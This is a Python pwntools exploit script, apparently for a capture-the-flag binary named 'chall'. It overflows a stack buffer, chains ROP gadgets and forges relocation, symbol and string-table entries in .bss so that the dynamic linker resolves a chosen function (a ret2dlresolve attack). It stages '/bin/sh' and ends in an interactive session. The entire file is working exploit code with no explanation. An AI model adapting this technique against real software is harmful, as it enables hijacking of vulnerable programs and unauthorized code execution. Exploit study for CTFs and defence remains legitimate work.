#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)
target = process("./chall")

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_got_gets = elf.got["gets"]
addr_bss = elf.bss()

# section
addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr
addr_rela_plt = elf.get_section_by_name(".rela.plt").header.sh_addr
addr_dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
addr_dynstr = elf.get_section_by_name(".dynstr").header.sh_addr

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address 
# addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 

stack_size = 0x800
base_stage = addr_bss + stack_size

# fake rela.plt
fake_rela_offset = (base_stage + 0x10) - addr_rela_plt
fake_rela_align = 0x18 - (fake_rela_offset % 0x18)
fake_rela_offset += fake_rela_align

puts_rela_offset = fake_rela_offset // 0x18

# fake .dynsym
fake_sym_offset = (base_stage + 0x10 + fake_rela_align + 0x18) - addr_dynsym
fake_sym_align = 0x18 - (fake_sym_offset % 0x18)
fake_sym_offset += fake_sym_align

# fake rela
fake_rela = p64(addr_got_gets)          # r_offset
fake_rela += p64((fake_sym_offset // 0x18) << 32 | 0x7)       # r_info
fake_rela += p64(0x0)                   # r_addend

# fake .dynstr
fake_str_offset = (base_stage + 0x10 + fake_rela_align + len(fake_rela) + fake_sym_align + 0x18) - addr_dynstr

# fake str
fake_str = b"puts\x00"

# fake sym
fake_sym = p32(fake_str_offset)        # st_name
fake_sym += p32(0x12)       # st_info, st_other, st_shndx
fake_sym += p64(0x0)        # st_value
fake_sym += p64(0x0)        # st_size

print("[*] addr .plt start : 0x{:x}".format(addr_plt_start))
print("[*] addr .rela.plt start : 0x{:x}".format(addr_rela_plt))
print("[*] addr .dynsym start : 0x{:x}".format(addr_dynsym))
print("[*] addr .dynstr start : 0x{:x}".format(addr_dynstr))

print("[*] addr fake puts_rela : 0x{:x}".format(base_stage + 0x10))

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
# buf += p64(addr_plt_puts)
buf += p64(addr_plt_start)
buf += p64(puts_rela_offset)
buf += p64(addr_plt_exit)

buf2 = b"/bin/sh\x00"
buf2 += p64(0x0)
buf2 += b"B" * fake_rela_align
buf2 += fake_rela
buf2 += b"C" * fake_sym_align
buf2 += fake_sym
buf2 += fake_str

_ = input()
target.sendline(buf)
target.sendline(buf2)

target.interactive()